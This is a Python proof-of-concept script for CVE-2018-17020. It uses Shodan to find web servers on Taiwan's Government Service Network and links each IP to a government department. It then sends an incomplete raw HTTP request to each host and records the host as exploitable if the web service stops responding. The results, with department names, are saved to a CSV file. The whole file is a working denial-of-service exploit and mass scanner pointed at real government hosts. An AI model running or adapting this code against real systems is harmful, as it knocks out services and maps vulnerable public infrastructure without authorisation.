"""Module Proof of Concept for CVE-2018-17020."""
import os
import socket
import sys

import pandas as pd
import requests

import helper.function as func
from package.shodan_adapter import ShodanAdapter
from package.ip2gov_adapter import Ip2govAdapter

ACCESSIBLE_CODES = [200, 401]


def get_response_code(request_url):
    """Function get http status code."""
    try:
        # ignore verifying the SSL certificate
        response = requests.get(request_url, allow_redirects=True, verify=False, timeout=5)
        return response.status_code
    except Exception as e:
        print(e)
        return False


def is_accessible(request_url):
    """Function confirm that web field is accessible."""
    code = get_response_code(request_url)
    if code not in ACCESSIBLE_CODES:
        return False

    return True


if __name__ == '__main__':

    ip2gov = Ip2govAdapter()
    sa = ShodanAdapter()

    # filer 1
    #search_filters = {
    #    'country': 'tw',
    #    'org': "Government Service Network (GSN)",
    #    'os': 'ASUSWRT',
    #}

    # filer 2
    #search_filters = {
    #    'country': 'tw',
    #    'org': 'Government Service Network (GSN)',
    #    'all': 'HTTP/1.0 200 OK Server: httpd/2.0',
    #    'port': '8080',
    #}

    # filer 3
    search_filters = {
        'country': 'tw',
        'org': 'Government Service Network (GSN)',
        'all': 'HTTP/1.0 200 OK Server: httpd/2.0',
    }

    match_fields = [
        {'label': 'ip', 'field': 'ip_str'},
        {'label': 'port', 'field': 'port'},
        {'label': 'product', 'field': 'product'},
        {'label': 'ssl', 'field': 'ssl'},
    ]

    fields = sa.basic_query(search_filters, match_fields)
    print(fields)

    IPERF3_PATH = 'set_iperf3_svr.cgi'
    output = []
    for field in fields:
        EXPLOITABLE = False
        IPERF3_RESOURCE = False

        host = field['ip']
        port = field['port']

        if field['ssl'] is None:
            field['ssl'] = False
            url = f"http://{host}:{port}"
        else:
            field['ssl'] = True
            url = f"https://{host}:{port}"

        field['url'] = url
        print(host, port, url)

        gov_data = ip2gov.get_gov_data_by_ip(field['ip'])
        if gov_data:
            department = gov_data.get('DEP')
            department_class = gov_data.get('Class')
            acc = gov_data.get('ACC') 
        else:
            department = None
            department_class = None 
            acc = None

        # [check 1]
        IPERF3_RESOURCE = is_accessible(f"{url}/{IPERF3_PATH}")
        IPERF3_RESOURCE_CODE = get_response_code(f"{url}/{IPERF3_PATH}")

        FIRST_VISIT = is_accessible(url)
        print(f"first_visit: {FIRST_VISIT}")

        if not FIRST_VISIT:
            print("early drop")
            output.append( 
                    field | \
                    {'department': department} | \
                    {'acc': acc} | \
                    {'class': department_class} | \
                    {'cve-2018-17020': EXPLOITABLE} | \
                    {'found_iperf3_cgi': IPERF3_RESOURCE} | \
                    {'http_code_of_iperf3_cgi': IPERF3_RESOURCE_CODE}
            )
            continue


        # [check 2]
        print('start socket')
        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the server
        client_socket.connect((host, port))

        # Prepare the raw HTTP request
        HTTP_REQUEST = 'GET / HTTP/1.1\r\n'

        # Send the request to the server
        print(f"send request: {HTTP_REQUEST}")
        client_socket.send(HTTP_REQUEST.encode())

        SECOND_VISIT = is_accessible(url)
        print(f"second_visit: {SECOND_VISIT}")

        if SECOND_VISIT:
            print("exploitable: False")
        else:
            EXPLOITABLE = True
            print("exploitable: True")

        # Close the socket
        client_socket.close()
        print('close socket')

        output.append(
                field | \
                {'department': department} | \
                {'acc': acc} | \
                {'class': department_class} | \
                {'cve-2018-17020': EXPLOITABLE} | \
                {'found_iperf3_cgi': IPERF3_RESOURCE} | \
                {'http_code_of_iperf3_cgi': IPERF3_RESOURCE_CODE}
        )

    output_dict = func.arr_dict_to_flat_dict(output)
    df = pd.DataFrame(output_dict)
    path_to_csv = os.path.join(os.path.dirname(__file__), "data", "use_cve_2018_17020.csv")
    df.to_csv(path_to_csv, index=False, encoding='utf-8-sig')
